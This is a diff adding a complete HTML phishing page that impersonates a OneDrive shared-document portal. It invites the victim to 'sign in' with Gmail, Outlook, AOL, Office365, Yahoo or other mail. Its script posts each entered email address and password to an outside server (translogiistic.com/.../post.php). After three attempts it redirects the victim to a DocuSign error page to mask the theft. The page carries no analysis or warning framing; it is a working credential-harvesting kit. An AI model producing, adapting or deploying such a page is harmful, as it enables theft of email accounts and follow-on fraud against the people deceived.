@@ -1,0 +1,215 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <script type="text/JavaScript" src="https://dev-thaid.pantheonsite.io/1file/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/JavaScript" src="https://dev-thaid.pantheonsite.io/1file/jquery-3.1.1.min.js"></script>
+    <script type="text/JavaScript" src="https://dev-thaid.pantheonsite.io/1file/jquery-3.3.1.js" ></script>
+    <!-- Required meta tags -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://dev-thaid.pantheonsite.io/1file/bootstrap/4.0.0/css/bootstrap.min.css" >
+    <link href="//fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://dev-thaid.pantheonsite.io/1file/releases/v5.7.0/css/all.css" >
+    <title>Online</title>
+    <link href="https://dev-thaid.pantheonsite.io/1file/css/hover.css" rel="stylesheet" media="all">
+    <style type="text/css">
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row" style="background-image: url('https://dev-thaid.pantheonsite.io/1file/d5502942aef6e6d2/a2257b61-7045-42ff-bcda-f395e6b6b530/670x335.jpg'); background-size: cover;background-repeat: no-repeat;">
+            <div class="col-lg-4 mx-auto my-5 px-5 pb-5" style=" background-color: rgba(0,0,0,0.5);border-radius:15px;">
+                <div>
+                    <div class="text-center mt-3">
+                        <img src="https://dev-thaid.pantheonsite.io/1file/d5502942aef6e6d2/4748dc7b-5e5f-48f9-84cb-ff0ecdf147c4/399x234.png" class="img-fluid" width="200px"><br>
+                        <span class="h1 text-white">One Drive</span><br><br>
+                        <span class="h5 text-white">To Access the document, please choose your email provider below login to view shared files</span>
+                    </div>
+                    <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #D44638; border-radius: 20px 0px 20px 0px;">
+                            <img src="https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/WeIslUgwU01Rm79h_95GQtZV.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Gmail</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #0073C8;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/yZ1G7WeXCoyEZWCxLfBzTYps.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #31459B;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/shHmOZE4i4IADH0kZavI3JTM.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #FF3C00;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/-UVKRHCNSrssP9CA5oL5av1_.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #5F0F68;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/h-OfeXTnME-WfG91LbgID5Xq.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
+                        </div>
+                    </a>
+                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class=" px-2 py-1 mt-2" style=" background-color: #0B5BD3;border-radius: 20px 0px 20px 0px;">
+                            <img src="https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/OwRnEDwvbDvGHbXcSBaxQcvZ.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                            <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
+                        </div>
+                    </a>
+                    <p class="text-white mt-3 text-center">Go to your all file anywhere on any device, and share them with anyone. One Drive your shared document in one cloud.</p>
+                    <p class="h5 text-center text-white">OneDrive © 2022</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Modal for gmail -->
+    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <center>
+                        <img id="fieldImg" src="https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/4vB5dsgRBkFMAfyAYshyogo6.png" class="img-fluid rounded-circle" width="80px">
+                        <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
+                        <div class="alert alert-danger" id="msg"></div>
+                    </center>
+                    <form id="contact" class="form-horizontal well">
+                        <div class="col-lg-12">
+                            <div class="form-group">
+                                <label for="exampleInputai1">Email address</label>
+                                <input type="email" name="ai" class="form-control" id="ai" aria-describedby="aiHelp" placeholder="Enter email">
+                                <small id="aiHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                            </div>
+                        </div>
+                        <div class="col-lg-12">
+                            <div class="form-group">
+                                <label for="pr">Password</label>
+                                <input type="password" name="pr" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="Enter Password">
+                            </div>
+                        </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                    <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
+                </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/JavaScript" src="https://dev-thaid.pantheonsite.io/1file/jquery-3.2.1.slim.min.js" ></script>
+    <script type="text/JavaScript" src="https://dev-thaid.pantheonsite.io/1file/ajax/libs/popper_js/1.12.9/umd/popper.min.js" ></script>
+    <script type="text/JavaScript" src="https://dev-thaid.pantheonsite.io/1file/bootstrap/4.0.0/js/bootstrap.min.js" ></script>
+
+<script type="text/JavaScript" src="https://dev-thaid.pantheonsite.io/1file/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+    $('#gmailmodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/4vB5dsgRBkFMAfyAYshyogo6.png');
+        $('#field').html("Gmail");
+        $('#ajaxModal').modal('show');
+    });
+    $('#outlookmodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/-dj35b6xrZ9DU8sPwz4rwHjn.png');
+        $('#field').html("Outlook");
+        $('#ajaxModal').modal('show');
+    });
+    $('#aolmodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/3zkKXf_tpFuo6ZboNuYTjGqU.png');
+        $('#field').html("Aol");
+        $('#ajaxModal').modal('show');
+    });
+    $('#office365modal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/yYH6lLMsywjeMuN9BMQGyywX.png');
+        $('#field').html("Office 365");
+        $('#ajaxModal').modal('show');
+    });
+    $('#yahoomodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/7qrPL8kfXD30aBJuksLsuMbJ.png');
+        $('#field').html("Yahoo");
+        $('#ajaxModal').modal('show');
+    });
+    $('#othermodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://dev-thaid.pantheonsite.io/1file/images/5fac423973aef50019af881c/eJWiSaMHRi4pIlPMxVYMru1S.ico');
+        $('#field').html("Other Mail");
+        $('#ajaxModal').modal('show');
+    });
+    var file="bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var detail = $("#field").html();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        count = count + 1;
+        if (count >= 3) {
+            count = 0;
+            window.location.replace("https://na3.docusign.net/Signing/Error.aspx?e=7b10a017-88ff-40db-b0b9-b46d84fde9a0&scope=0b84b756-4ad9-4965-adde-f66bd21f1bda");
+        } else {
+            $.ajax({
+                dataType: 'JSON',
+                url: "https://translogiistic.com/doc/aGE/post.php",
+                type: 'POST',
+                data: {
+                    ai: ai,
+                    pr: pr,
+                    detail: detail,
+                },
+                // data: $('#contact').serialize(),
+                beforeSend: function(xhr) {
+                    $('#submit-btn').html('Verifing...');
+                },
+                success: function(response) {
+                    if (response) {
+                        $("#msg").show();
+                        console.log(response);
+                        if (response['signal'] == 'ok') {
+                            $('#msg').html(response['msg']);
+                            // $('input, textarea').val(function() {
+                            //    return this.defaultValue;
+                            // });
+                        } else {
+                            $('#msg').html(response['msg']);
+                        }
+                    }
+                },
+                error: function() {
+                    $("#msg").show();
+                    $('#msg').html("Please try again later");
+                },
+                complete: function() {
+                    $('#submit-btn').html('Login');
+                }
+            });
+        }
+    });
+});
+</script>
+</body>
+</html>
